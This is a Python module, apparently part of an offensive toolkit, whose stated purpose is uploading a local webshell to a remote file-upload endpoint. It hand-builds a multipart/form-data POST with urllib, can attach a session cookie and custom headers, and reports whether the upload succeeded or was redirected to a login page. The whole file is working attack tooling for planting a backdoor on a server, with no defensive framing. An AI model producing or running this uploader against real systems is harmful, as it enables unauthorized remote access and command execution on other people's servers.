"""Upload a local webshell to a remote file-upload endpoint.

Stdlib only: the multipart/form-data body is built by hand and POSTed with
urllib. Success is the final HTTP status being 200; redirects are followed and
the final URL is reported so a redirect to a login page is visible.
"""

from __future__ import annotations

import urllib.error
import urllib.request
import uuid
from dataclasses import dataclass
from pathlib import Path
from typing import Mapping

_DEFAULT_TIMEOUT = 15.0
_FILE_CONTENT_TYPE = "application/octet-stream"


@dataclass(frozen=True)
class UploadResult:
    success: bool
    status: int | None
    final_url: str
    error: str | None = None


def build_multipart(
    *,
    field: str,
    filename: str,
    data: bytes,
    form: Mapping[str, str] | None = None,
) -> tuple[str, bytes]:
    """Return ``(content_type, body)`` for a multipart/form-data upload."""
    boundary = "----ShellSuite" + uuid.uuid4().hex
    chunks: list[bytes] = []

    for key, value in (form or {}).items():
        chunks.append(
            (
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="{key}"\r\n\r\n'
                f"{value}\r\n"
            ).encode("utf-8")
        )

    chunks.append(
        (
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'
            f"Content-Type: {_FILE_CONTENT_TYPE}\r\n\r\n"
        ).encode("utf-8")
        + data
        + b"\r\n"
    )
    chunks.append(f"--{boundary}--\r\n".encode("utf-8"))

    return f"multipart/form-data; boundary={boundary}", b"".join(chunks)


def upload(
    file_path: Path | str,
    url: str,
    *,
    field: str = "uploaded",
    filename: str | None = None,
    cookie: str | None = None,
    headers: Mapping[str, str] | None = None,
    form: Mapping[str, str] | None = None,
    timeout: float = _DEFAULT_TIMEOUT,
) -> UploadResult:
    """POST ``file_path`` to ``url``; never raises for network/status failures."""
    path = Path(file_path)
    data = path.read_bytes()
    upload_name = filename or path.name

    content_type, body = build_multipart(
        field=field, filename=upload_name, data=data, form=form
    )

    request_headers = {"Content-Type": content_type}
    if headers:
        request_headers.update(headers)
    if cookie:
        request_headers["Cookie"] = cookie

    request = urllib.request.Request(
        url, data=body, headers=request_headers, method="POST"
    )

    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            status = response.getcode()
            final_url = response.geturl()
            response.read()
        return UploadResult(success=status == 200, status=status, final_url=final_url)
    except urllib.error.HTTPError as exc:
        try:
            exc.read()
        except OSError:
            pass
        return UploadResult(
            success=False, status=exc.code, final_url=exc.geturl() or url
        )
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        reason = getattr(exc, "reason", exc)
        return UploadResult(success=False, status=None, final_url=url, error=str(reason))
